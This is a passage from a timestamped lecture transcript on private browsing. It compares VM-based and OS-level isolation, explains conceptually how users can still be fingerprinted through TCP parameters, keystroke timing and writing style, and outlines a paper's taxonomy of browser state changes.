get those at the end.</text_slice>
            </slice>
            <slice>
              <time_slice>56:59</time_slice>
              <text_slice>It can be done.</text_slice>
            </slice>
            <slice>
              <time_slice>57:00</time_slice>
              <text_slice>But there's a lot
of friction here.</text_slice>
            </slice>
            <slice>
              <time_slice>57:02</time_slice>
              <text_slice>So that's the bummer.</text_slice>
            </slice>
            <slice>
              <time_slice>57:05</time_slice>
              <text_slice>So another thing that
you might imagine doing</text_slice>
            </slice>
            <slice>
              <time_slice>57:11</time_slice>
              <text_slice>is something that looks
like approach number one.</text_slice>
            </slice>
            <slice>
              <time_slice>57:16</time_slice>
              <text_slice>But we actually implement it
inside of the OS themselves</text_slice>
            </slice>
            <slice>
              <time_slice>57:23</time_slice>
              <text_slice>instead of in a virtual machine.</text_slice>
            </slice>
            <slice>
              <time_slice>57:26</time_slice>
              <text_slice>So the basic idea
here is that you</text_slice>
            </slice>
            <slice>
              <time_slice>57:28</time_slice>
              <text_slice>can imagine that each
process could potentially</text_slice>
            </slice>
            <slice>
              <time_slice>57:35</time_slice>
              <text_slice>run in a privacy domain.</text_slice>
            </slice>
            <slice>
              <time_slice>57:44</time_slice>
              <text_slice>So basically, the privacy
domain access the collection</text_slice>
            </slice>
            <slice>
              <time_slice>57:51</time_slice>
              <text_slice>of OS global resources
that process uses.</text_slice>
            </slice>
            <slice>
              <time_slice>57:54</time_slice>
              <text_slice>And so the OS tracks
all that kind of stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>57:56</time_slice>
              <text_slice>And then once the process
dies, essentially the OS</text_slice>
            </slice>
            <slice>
              <time_slice>58:00</time_slice>
              <text_slice>goes through and looks
at all the things</text_slice>
            </slice>
            <slice>
              <time_slice>58:01</time_slice>
              <text_slice>that are in that
privacy domain set.</text_slice>
            </slice>
            <slice>
              <time_slice>58:04</time_slice>
              <text_slice>And then purely deallocate
all those resources.</text_slice>
            </slice>
            <slice>
              <time_slice>58:09</time_slice>
              <text_slice>And so the advantage
of this over the VM</text_slice>
            </slice>
            <slice>
              <time_slice>58:12</time_slice>
              <text_slice>is that it is lighter weight
because if you think about it,</text_slice>
            </slice>
            <slice>
              <time_slice>58:20</time_slice>
              <text_slice>the VM is essentially agnostic
to all the OS state and all</text_slice>
            </slice>
            <slice>
              <time_slice>58:23</time_slice>
              <text_slice>the application state that is
actually being used to run.</text_slice>
            </slice>
            <slice>
              <time_slice>58:26</time_slice>
              <text_slice>So the result-- it probably
does more work than the OS</text_slice>
            </slice>
            <slice>
              <time_slice>58:29</time_slice>
              <text_slice>would have to do because
the OS presumably</text_slice>
            </slice>
            <slice>
              <time_slice>58:31</time_slice>
              <text_slice>knows all the points at which
the private browser would</text_slice>
            </slice>
            <slice>
              <time_slice>58:35</time_slice>
              <text_slice>be touching I/O, and talk to the
network, and stuff like that.</text_slice>
            </slice>
            <slice>
              <time_slice>58:38</time_slice>
              <text_slice>So maybe it even knows
things like you can actually</text_slice>
            </slice>
            <slice>
              <time_slice>58:40</time_slice>
              <text_slice>clear the DNS cache
selectively, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>58:43</time_slice>
              <text_slice>So you can imagine
that it's much easier</text_slice>
            </slice>
            <slice>
              <time_slice>58:46</time_slice>
              <text_slice>to spin these things up--
these privacy domains--</text_slice>
            </slice>
            <slice>
              <time_slice>58:49</time_slice>
              <text_slice>then to tear them down.</text_slice>
            </slice>
            <slice>
              <time_slice>58:51</time_slice>
              <text_slice>However, the sad thing,
at least with respect</text_slice>
            </slice>
            <slice>
              <time_slice>58:53</time_slice>
              <text_slice>to the virtual machine
solution, is that it's harder</text_slice>
            </slice>
            <slice>
              <time_slice>58:58</time_slice>
              <text_slice>to get this right.</text_slice>
            </slice>
            <slice>
              <time_slice>59:03</time_slice>
              <text_slice>So I just described
the VM approach</text_slice>
            </slice>
            <slice>
              <time_slice>59:07</time_slice>
              <text_slice>as being headway
because it's essentially</text_slice>
            </slice>
            <slice>
              <time_slice>59:09</time_slice>
              <text_slice>agnostic to everything that's
running inside the container.</text_slice>
            </slice>
            <slice>
              <time_slice>59:12</time_slice>
              <text_slice>But what's nice about
that is that allows</text_slice>
            </slice>
            <slice>
              <time_slice>59:14</time_slice>
              <text_slice>the VM approach to only focus
on a few low-level interfaces.</text_slice>
            </slice>
            <slice>
              <time_slice>59:18</time_slice>
              <text_slice>And it can focus
on those things.</text_slice>
            </slice>
            <slice>
              <time_slice>59:20</time_slice>
              <text_slice>For example, the interface
the VM uses to write to disk,</text_slice>
            </slice>
            <slice>
              <time_slice>59:23</time_slice>
              <text_slice>then you can have high
confidence that it's actually</text_slice>
            </slice>
            <slice>
              <time_slice>59:27</time_slice>
              <text_slice>managed to contain everything.</text_slice>
            </slice>
            <slice>
              <time_slice>59:29</time_slice>
              <text_slice>Whereas with the
OS-- if you think</text_slice>
            </slice>
            <slice>
              <time_slice>59:30</time_slice>
              <text_slice>the OS is going to interpose
on individual files with system</text_slice>
            </slice>
            <slice>
              <time_slice>59:33</time_slice>
              <text_slice>interfaces-- perhaps individual
network interfaces and stuff</text_slice>
            </slice>
            <slice>
              <time_slice>59:35</time_slice>
              <text_slice>like that-- it's much
more complicated to find</text_slice>
            </slice>
            <slice>
              <time_slice>59:37</time_slice>
              <text_slice>all of those points at which
data can leak if you're going</text_slice>
            </slice>
            <slice>
              <time_slice>59:42</time_slice>
              <text_slice>to do that at the OS level.</text_slice>
            </slice>
            <slice>
              <time_slice>59:44</time_slice>
              <text_slice>So does that all make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>59:57</time_slice>
              <text_slice>Why is this physics everywhere?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:02</time_slice>
              <text_slice>Ah, god, I'm being tested.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:09</time_slice>
              <text_slice>Those are basically
some approaches</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:10</time_slice>
              <text_slice>we can use to provide
potentially stronger privacy</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:13</time_slice>
              <text_slice>guarantees than what's
implemented in private browsers</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:16</time_slice>
              <text_slice>right now.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:18</time_slice>
              <text_slice>So one question you might
have is can we still</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:26</time_slice>
              <text_slice>be an anonymized user
if the browser-- sorry,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:33</time_slice>
              <text_slice>if the user is employing one of
these more powerful solutions--</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:38</time_slice>
              <text_slice>if the user is
surfing through VM</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:43</time_slice>
              <text_slice>or surfing one of these
privacy domains in the OS-- can</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:45</time_slice>
              <text_slice>we still figure
out who they are?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:46</time_slice>
              <text_slice>And the answer is, yes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:48</time_slice>
              <text_slice>So maybe the VM is
unique for some reason.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:56</time_slice>
              <text_slice>And so similar to how we were
able to fingerprint browsers</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:02</time_slice>
              <text_slice>using that Panopticlick
website, maybe there's</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:04</time_slice>
              <text_slice>something unique about the way
that the VM would be set up</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:07</time_slice>
              <text_slice>that allows to fingerprint it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:09</time_slice>
              <text_slice>And it may in fact be the case
that maybe the virtual machine</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:14</time_slice>
              <text_slice>monitor or the OS itself
is unique in some ways.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:20</time_slice>
              <text_slice>That would allow a web attacker
to figure out who the user was.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:23</time_slice>
              <text_slice>And so one cute example of
this is TCP fingerprinting.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:32</time_slice>
              <text_slice>So what's the big
idea behind this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:34</time_slice>
              <text_slice>So as it turns out,
the specification</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:35</time_slice>
              <text_slice>for the TCP protocol
actually allows</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:38</time_slice>
              <text_slice>some of the parameters
for the protocol</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:40</time_slice>
              <text_slice>to be set by the
implementation of the protocol.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:44</time_slice>
              <text_slice>So, for example, TCP allows
implementers to choose things</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:47</time_slice>
              <text_slice>like initial packet
size-- the things that</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:49</time_slice>
              <text_slice>are sent out the first part
of the TCP connection--</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:52</time_slice>
              <text_slice>it allows implementers to choose
things like that initial time</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:55</time_slice>
              <text_slice>to live in those packets.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:57</time_slice>
              <text_slice>And so you can imagine,
and in fact, you</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:59</time_slice>
              <text_slice>don't have to imagine that
this is actually the truth.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:01</time_slice>
              <text_slice>You can get off-the shelf
tools like InMap, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:04</time_slice>
              <text_slice>that they actually can tell
what operating system you're</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:07</time_slice>
              <text_slice>running with high probability
just by sending you packets.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:10</time_slice>
              <text_slice>They'll send these very
carefully crafted packets.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:13</time_slice>
              <text_slice>And they will look and
see things like here's</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:15</time_slice>
              <text_slice>what the TTL was or here's
what the packet size</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:17</time_slice>
              <text_slice>distribution was-- here's what
the TTP sequence number was.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:20</time_slice>
              <text_slice>And they basically have a
database to fingerprint.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:22</time_slice>
              <text_slice>And they say, OK, if the
return packet has this, this,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:24</time_slice>
              <text_slice>and this characteristic,
then the table</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:27</time_slice>
              <text_slice>says that you're probably
running for some reason</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:29</time_slice>
              <text_slice>Solaris.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:30</time_slice>
              <text_slice>You're running Mac.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:31</time_slice>
              <text_slice>You're running
Windows or whatever.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:34</time_slice>
              <text_slice>So even if we use one of
these stronger approaches</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:36</time_slice>
              <text_slice>for private browsing
with a VM or an OS,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:39</time_slice>
              <text_slice>you still may be able to run
one of those TCP fingerprinting</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:41</time_slice>
              <text_slice>attacks and learn a lot
about a particular user.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:45</time_slice>
              <text_slice>And one thing that's
also interesting to note</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:50</time_slice>
              <text_slice>is that even if we use one of
these more powerful techniques</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:56</time_slice>
              <text_slice>to try to protect the
user, the user is still</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:59</time_slice>
              <text_slice>shared across both the public
and the private browsing</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:04</time_slice>
              <text_slice>session.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:05</time_slice>
              <text_slice>Still uses-- visibly
using the machine.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:07</time_slice>
              <text_slice>So why is it interesting?</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:09</time_slice>
              <text_slice>Well, it's interesting
because you yourself</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:13</time_slice>
              <text_slice>by way that you use computers,
may leak information</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:17</time_slice>
              <text_slice>about yourself.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:17</time_slice>
              <text_slice>So, for example,
as it turns out,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:22</time_slice>
              <text_slice>users have unique
keystroke timing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:29</time_slice>
              <text_slice>So if I look at-- if I give
everyone in this class the same</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:32</time_slice>
              <text_slice>thing to type in --
the quick, brown fox--</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:35</time_slice>
              <text_slice>whatever that nonsense
is-- and I actually look</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:37</time_slice>
              <text_slice>at the inter-key press timing,
we'll all have these unique</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:42</time_slice>
              <text_slice>distributions that can
potentially be used</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:44</time_slice>
              <text_slice>to fingerprint us.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:46</time_slice>
              <text_slice>Another thing that's
interesting is that users</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:50</time_slice>
              <text_slice>have unique writing styles.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:55</time_slice>
              <text_slice>So there's this
branch of security</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:00</time_slice>
              <text_slice>that is called stylography.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:06</time_slice>
              <text_slice>And the basic idea here is to
figure out if I am an attacker,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:12</time_slice>
              <text_slice>can I figure out
who you are just</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:14</time_slice>
              <text_slice>by looking at writing
samples from you?</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:16</time_slice>
              <text_slice>So imagine that
for whatever reason</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:18</time_slice>
              <text_slice>you're hanging out on 4chan--
don't hang out on 4chan--</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:21</time_slice>
              <text_slice>and I want to figure out if
you've actually, in fact,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:23</time_slice>
              <text_slice>been hanging out on 4chan.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:24</time_slice>
              <text_slice>So perhaps what
I can do is I can</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:27</time_slice>
              <text_slice>look at a bunch of
different posts from 4chan.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:30</time_slice>
              <text_slice>Maybe I can cluster those
posts into sets of posts</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:34</time_slice>
              <text_slice>that I think look
stylistically the same.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:37</time_slice>
              <text_slice>And then what I can do
is I can find things</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:39</time_slice>
              <text_slice>that you've written publicly
where you're actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:42</time_slice>
              <text_slice>attributed as the author.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:43</time_slice>
              <text_slice>I'll look at you homework
assignments or papers</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:45</time_slice>
              <text_slice>that you've written
or things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:47</time_slice>
              <text_slice>And I'll see do you match
any of these clusters</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:49</time_slice>
              <text_slice>from these 4chan comments.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:51</time_slice>
              <text_slice>And if so, them maybe I can say
maybe send you a stern note.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:53</time_slice>
              <text_slice>Talk to the parents that
their kid has gone off</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:55</time_slice>
              <text_slice>the beaten path.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:56</time_slice>
              <text_slice>Get off of 4chan.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:57</time_slice>
              <text_slice>So the reason is I would like
to look at this thing called</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:00</time_slice>
              <text_slice>stylography.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:00</time_slice>
              <text_slice>It's actually quite interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:03</time_slice>
              <text_slice>Does anyone have any
questions about that?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:06</time_slice>
              <text_slice>Excellent.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:09</time_slice>
              <text_slice>So we discuss how we
might be able to use</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:15</time_slice>
              <text_slice>VM or modified operating systems
to provide private browsing</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:19</time_slice>
              <text_slice>support.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:20</time_slice>
              <text_slice>And so you might wonder, OK,
well, then why don't browsers</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:23</time_slice>
              <text_slice>require users to do
one of these things--</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:25</time_slice>
              <text_slice>to have one of these tricked
out VMs or tricked out OSes?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:28</time_slice>
              <text_slice>So why do browsers
take it upon themselves</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:30</time_slice>
              <text_slice>to implement all this stuff?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:31</time_slice>
              <text_slice>And so the main reason
is deployability.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:34</time_slice>
              <text_slice>So in fact, browser
vendors typically</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:36</time_slice>
              <text_slice>do not want to ask their
users to do anything special</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:39</time_slice>
              <text_slice>to use the browser besides
install the browser binary</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:42</time_slice>
              <text_slice>itself.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:43</time_slice>
              <text_slice>This is similar
to the motivation</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:44</time_slice>
              <text_slice>of the native client.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:45</time_slice>
              <text_slice>So if Google wants to
add these cool future</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:47</time_slice>
              <text_slice>to end users' computers.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:49</time_slice>
              <text_slice>But it doesn't
want to force users</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:50</time_slice>
              <text_slice>to install some special
version of Windows or Linux</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:53</time_slice>
              <text_slice>or whatever.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:54</time_slice>
              <text_slice>So Google basically says, we'll
take care of this ourselves.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:58</time_slice>
              <text_slice>Then another reason
is actually usability.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:01</time_slice>
              <text_slice>So a lot of these
VM and OS-level</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:04</time_slice>
              <text_slice>solutions in private
browsing-- as we've discussed,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:07</time_slice>
              <text_slice>they make it more
difficult for users</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:08</time_slice>
              <text_slice>to persist state from
private browsing sessions</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:12</time_slice>
              <text_slice>that they do actually want to
persist like downloading files</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:15</time_slice>
              <text_slice>like bookmarks they create
and things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:19</time_slice>
              <text_slice>So basically the browser
vendors say, well,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:21</time_slice>
              <text_slice>if we implement private
browsing modes ourselves,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:23</time_slice>
              <text_slice>we can actually allow
users to do those things.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:25</time_slice>
              <text_slice>We can allow users to
take downloaded files</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:27</time_slice>
              <text_slice>from private browsing
mode and take them</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:29</time_slice>
              <text_slice>to the rest of the machine.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:30</time_slice>
              <text_slice>So that seems nice at first.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:32</time_slice>
              <text_slice>But note that, of course,
that allowing users</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:35</time_slice>
              <text_slice>to export some type
of private state</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:37</time_slice>
              <text_slice>actually opens up a lot of
security vulnerabilities.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:40</time_slice>
              <text_slice>It makes it very difficult to
analyze security properties</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:43</time_slice>
              <text_slice>that result in private browsing
modes actually provide.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:49</time_slice>
              <text_slice>And so in the paper,
they try to characterize</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:53</time_slice>
              <text_slice>the different types of browser
states that can be modified</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:57</time_slice>
              <text_slice>and how current private
browsing modes actually handle</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:01</time_slice>
              <text_slice>the modifications at stake.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:03</time_slice>
              <text_slice>So the paper describes
this taxonomy</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:06</time_slice>
              <text_slice>of browser state changes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:12</time_slice>
              <text_slice>And so there are four
things in the taxonomy.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:14</time_slice>
              <text_slice>So one type of state
change is initiated</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:22</time_slice>
              <text_slice>by the website itself.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:25</time_slice>
              <text_slice>And there's no user interaction.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:29</time_slice>
              <text_slice>And so examples of this
type of state change</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:33</time_slice>
              <text_slice>think about stuff like
when a cookie gets</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:37</time_slice>
              <text_slice>set-- when something
gets added to the address</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:43</time_slice>
              <text_slice>history of the browser--
maybe within a browser</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:49</time_slice>
              <text_slice>cache or something.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:52</time_slice>
              <text_slice>And so from this type
of state, basically,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:56</time_slice>
              <text_slice>private browsing
mode says this state</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:57</time_slice>
              <text_slice>is a private browsing
mode session.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:01</time_slice>
              <text_slice>But it basically is
going to be destroyed</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:03</time_slice>
              <text_slice>when that private browsing
session concludes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:05</time_slice>
              <text_slice>And so the intuition behind
this is that because there</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:10</time_slice>
              <text_slice>is no user interaction
in creating this state,</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:14</time_slice>
              <text_slice>then perhaps the right
thing for the browser to do</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:16</time_slice>
              <text_slice>is assume that the user
wouldn't want that to persist.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:21</time_slice>
              <text_slice>So another type of
browser state change</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:25</time_slice>
              <text_slice>is initiated by the website
that the user is visiting.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:32</time_slice>
              <text_slice>But there is some type of
user interaction involved</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:37</time_slice>
              <text_slice>in the state change.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:40</time_slice>
              <text_slice>So an example of this might
be the user installs client</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:45</time_slice>
              <text_slice>certificate or maybe
there's a safe password.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:53</time_slice>
              <text_slice>So the user tries to
login to something.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:57</time_slice>
              <text_slice>And the browser says
very helpfully would you</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:00</time_slice>
              <text_slice>like to save this password?</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:01</time_slice>
              <text_slice>And then if the users
says, yes, then these types</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:03</time_slice>
              <text_slice>of things, say
passwords, can actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:05</time_slice>
              <text_slice>be used outside of the
private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:08</time_slice>
              <text_slice>And so it's a little
bit unclear in principle</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:12</time_slice>
              <text_slice>what the policy
for this should be.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:14</time_slice>
              <text_slice>So what ends up
happening in practice</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:16</time_slice>
              <text_slice>is that browsers
typically allow statements</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:20</time_slice>
              <text_slice>in this category that set
in private browsing modes</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:23</time_slice>
              <text_slice>to persist outside of
that private browsing mode</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:26</time_slice>
              <text_slice>under the intuition that the
user did have to say yes or no.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:29</time_slice>
              <text_slice>If the user said, yes,
then maybe the user</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:31</time_slice>
              <text_slice>is smart enough to
understand that they</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:35</time_slice>
              <text_slice>save some password
for some unsavory site</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:38</time_slice>
              <text_slice>and someone comes
on later and figures</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:39</time_slice>
              <text_slice>that out, that's the users
fault-- not the browsers fault.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:42</time_slice>
              <text_slice>So it's a little unclear
what the best policy is here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:45</time_slice>
              <text_slice>But in practice, this
type of state change</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:46</time_slice>
              <text_slice>is allowed to persist outside
of private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:52</time_slice>
              <text_slice>So there's another type
of state change, which is</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:54</time_slice>
              <text_slice>purely initiated by the user.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:59</time_slice>
              <text_slice>And so here you can think about
things like setting a bookmark</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:05</time_slice>
              <text_slice>or maybe downloading files.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:11</time_slice>
              <text_slice>And so the story
for this state is</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:13</time_slice>
              <text_slice>similar to the story
for the state up here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:15</time_slice>
              <text_slice>So basically because
the user was explicitly</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:18</time_slice>
              <text_slice>involved in the
creation of that state.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:20</time_slice>
              <text_slice>Private browsing modes
typically say, OK, it's</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:22</time_slice>
              <text_slice>OK to persist these
types of changes</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:25</time_slice>
              <text_slice>to the outside world outside
of private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:29</time_slice>
              <text_slice>Then there's some
sets of state which</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:31</time_slice>
              <text_slice>are actually unrelated to any
particular session at all.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:40</time_slice>
              <text_slice>So this is stuff, for example,
like an update to the browser</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:46</time_slice>
              <text_slice>itself-- the actual binary
that constitutes the browser.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:53</time_slice>
              <text_slice>And so the way the browser
vendors think about this state</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:56</time_slice>
              <text_slice>is this state is
essentially assumed</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:57</time_slice>
              <text_slice>to be part of the single,
global state that's</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:01</time_slice>
              <text_slice>available to both public
